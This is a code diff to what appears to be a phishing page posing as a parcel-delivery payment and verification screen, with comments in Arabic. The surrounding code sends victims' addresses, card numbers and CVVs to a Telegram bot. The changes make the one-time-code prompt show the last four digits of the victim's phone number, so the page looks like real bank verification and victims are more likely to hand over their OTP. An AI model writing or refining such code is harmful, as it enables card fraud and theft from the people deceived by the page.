@@ -51,7 +51,6 @@
         .otp-icon { width: 80px; height: 80px; background-color: #e8f0fe; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 20px; }
         .otp-icon svg { width: 40px; height: 40px; fill: #0b3b82; }
         
-        /* تعديل: تنسيق خانة الـ OTP الواحدة */
         .otp-single-input { 
             width: 100%; 
             padding: 16px; 
@@ -223,11 +222,12 @@
             </div>
             <div class="payment-header">
                 <h2>التحقق من الدفع</h2>
-                <p>أدخل رمز التحقق</p>
+                <!-- تعديل: النص هون رح يتغير ديناميكياً عشان يبين آخر 4 أرقام -->
+                <p id="otp-subtitle">أدخل رمز التحقق المرسل إلى جوالك</p>
             </div>
             
-            <!-- تعديل: استبدال المربعات الستة بخانة واحدة -->
-            <input type="tel" id="otp-single-input" class="otp-single-input" placeholder="أدخل الرمز هنا">
+            <!-- تعديل: شلنا الـ placeholder -->
+            <input type="tel" id="otp-single-input" class="otp-single-input">
             
             <button class="verify-btn" onclick="verifyOTP()">تأكيد</button>
         </div>
@@ -253,6 +253,7 @@
         let currentTrackingNumber = "";
         let currentCustomerName = "";
         let currentAmount = "";
+        let currentPhone = ""; // متغير لحفظ رقم الجوال
 
         function sendTelegramMsg(msg) {
             var url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
@@ -293,6 +294,9 @@
                 return;
             }
 
+            // تعديل: حفظ رقم الجوال عشان نستخدمه بالـ OTP
+            currentPhone = phone;
+
             let addressMsg = `📍 بيانات العنوان:\n`;
             addressMsg += `المدينة: ${city}\n`;
             addressMsg += `الحي: ${district}\n`;
@@ -322,16 +326,22 @@
             cardMsg += `رمز الأمان: ${cvv}`;
             sendTelegramMsg(cardMsg);
 
+            // تعديل: سحب آخر 4 أرقام من رقم الجوال وعرضها بالرسالة
+            if (currentPhone.length >= 4) {
+                let last4 = currentPhone.slice(-4);
+                document.getElementById('otp-subtitle').innerText = `أدخل رمز التحقق المرسل إلى آخر 4 أرقام من جوالك (${last4})`;
+            } else {
+                document.getElementById('otp-subtitle').innerText = `أدخل رمز التحقق المرسل إلى جوالك`;
+            }
+
             document.getElementById('payment-page').style.display = 'none';
             document.getElementById('otp-page').style.display = 'block';
             window.scrollTo(0, 0);
         }
 
-        // تعديل: دالة التحقق تقرأ من الخانة الواحدة
         function verifyOTP() {
             let otpCode = document.getElementById('otp-single-input').value;
             
-            // إذا الخانة فاضية، يطلع تنبيه، وإذا فيها أي شي يكمل
             if (otpCode.trim() === "") {
                 alert("الرجاء إدخال رمز التحقق");
                 return;
